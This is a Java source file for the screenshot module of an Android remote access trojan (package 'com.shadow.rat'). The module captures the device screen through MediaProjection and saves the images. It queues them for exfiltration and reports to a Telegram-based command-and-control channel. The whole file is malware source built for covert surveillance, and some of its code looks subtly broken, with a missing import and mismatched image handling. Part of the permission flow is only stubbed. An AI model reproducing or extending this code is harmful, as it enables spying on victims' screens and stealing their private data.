package com.shadow.rat.modules;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import com.shadow.rat.c2.TelegramC2Manager;
import com.shadow.rat.exfiltration.ExfiltrationManager;
import com.shadow.rat.utils.Logger;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class ScreenshotModule {
    private static final String TAG = "ScreenshotModule";
    private final Context context;
    private final TelegramC2Manager c2Manager;
    private final ExfiltrationManager exfiltrationManager;
    private final AtomicBoolean isCapturing = new AtomicBoolean(false);
    
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    
    public ScreenshotModule(Context context) {
        this.context = context;
        this.c2Manager = TelegramC2Manager.getInstance(context);
        this.exfiltrationManager = ExfiltrationManager.getInstance(context);
        this.projectionManager = (MediaProjectionManager) 
            context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        setupBackgroundThread();
    }
    
    private void setupBackgroundThread() {
        backgroundThread = new HandlerThread("ScreenshotModule");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    public void capture(String args) {
        // MediaProjection requires user consent via system dialog
        c2Manager.sendMessage("📸 Screenshot capture requires user consent");
        c2Manager.sendMessage("ℹ️ User must approve system dialog: 'Start recording or casting?'");
        
        // In a real implementation, you would need to:
        // 1. Start an activity to request MediaProjection permission
        // 2. Get result with EXTRA_MEDIA_PROJECTION
        // 3. Use the result to create a virtual display
        // 4. Capture from ImageReader
        
        // This is a stub that demonstrates the flow
        ThreadPoolManager.getExecutorService().execute(() -> {
            if (isCapturing.get()) {
                c2Manager.sendMessage("⚠️ Screenshot already in progress");
                return;
            }
            
            // Request permission via activity
            // Intent permissionIntent = projectionManager.createScreenCaptureIntent();
            // context.startActivity(permissionIntent);
        });
    }
    
    public void startCaptureWithPermission(Intent data) {
        if (isCapturing.get()) {
            return;
        }
        
        try {
            isCapturing.set(true);
            mediaProjection = projectionManager.getMediaProjection(Activity.RESULT_OK, data);
            
            WindowManager windowManager = (WindowManager) 
                context.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getMetrics(metrics);
            
            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;
            
            imageReader = ImageReader.newInstance(width, height, 
                android.graphics.ImageFormat.JPEG, 2);
            
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenshotCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, backgroundHandler
            );
            
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image != null) {
                    processScreenshot(image);
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Logger.e(TAG, "Screenshot capture failed", e);
            isCapturing.set(false);
            c2Manager.sendMessage("❌ Screenshot failed: " + e.getMessage());
        }
    }
    
    private void processScreenshot(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            byte[] imageData = new byte[buffer.remaining()];
            buffer.get(imageData);
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", 
                Locale.US).format(new Date());
            String fileName = "screenshot_" + timestamp + ".jpg";
            String filePath = context.getExternalFilesDir(null).getAbsolutePath() 
                + "/" + fileName;
            
            FileOutputStream fos = new FileOutputStream(filePath);
            fos.write(imageData);
            fos.close();
            
            image.close();
            
            c2Manager.sendMessage("📸 Screenshot captured: " + fileName);
            exfiltrationManager.queueFileUpload(filePath, "image/jpeg");
            
        } catch (Exception e) {
            Logger.e(TAG, "Screenshot processing failed", e);
        } finally {
            isCapturing.set(false);
            cleanup();
        }
    }
    
    private void cleanup() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
    }
    
    public void shutdown() {
        isCapturing.set(false);
        cleanup();
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
    }
}